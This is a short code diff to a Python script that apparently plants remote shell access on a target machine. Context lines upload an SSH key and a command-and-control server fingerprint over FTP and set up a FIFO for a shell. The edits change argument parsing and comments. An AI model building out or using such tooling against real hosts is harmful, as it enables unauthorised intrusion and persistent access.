@@ -43,10 +43,8 @@ def parse_configuration():
                         help='configuration file to use')
     parser.add_argument('-t', '--test', help='run in test mode (do not run the shell)',
                         default=False, action='store_true')
-    parser.add_argument('-p', '--privacy', help='hide the username on the password promt',
-                        default=False, action='store_true')
     parser.add_argument('-s', '--savestate', type=str,
-                        help='save the running configuration (including ssh keys) to this file',
+                        help='save the running configuration (including credentials) to a config file',
                         default=None)
     args = parser.parse_args()
     # Config file parsing
@@ -58,14 +56,9 @@ def parse_configuration():
             print('WARNING: password in config file!')
             print('Consider using the interactive password request')
     except KeyError:
-        if args.privacy:
-            password_prompt = 'Input the password for ' + config['hostname'] + \
-                              ': '
-        else:
-            password_prompt = 'Input the password for ' + config['username'] + \
-                              ' on ' + config['hostname'] + ': '
+        password_prompt = 'Input the password for ' + config['username'] + \
+                          ' on ' + config['hostname'] + ': '
         config['password'] = getpass.getpass(password_prompt)
-    #TODO: add assert on the NEEDED config parameters
     return(global_config, args)
 
 if __name__ == '__main__':
@@ -115,10 +108,10 @@ if __name__ == '__main__':
     ftpfifoname = ftp.gen_random_filename(path=config['temporary_path'])
     ftpknownhosts = ftp.gen_random_filename(path=config['temporary_path'])
 
-    # Save the key
+    # Save the key on the target
     ftp.upload_string_as_file(key, ftpkeyname)
 
-    # Save the known host file
+    # Save the known host file on the target
     ftp.upload_string_as_file(cc_server_fingerprint, ftpknownhosts)
 
     # Create the FIFO for the shell
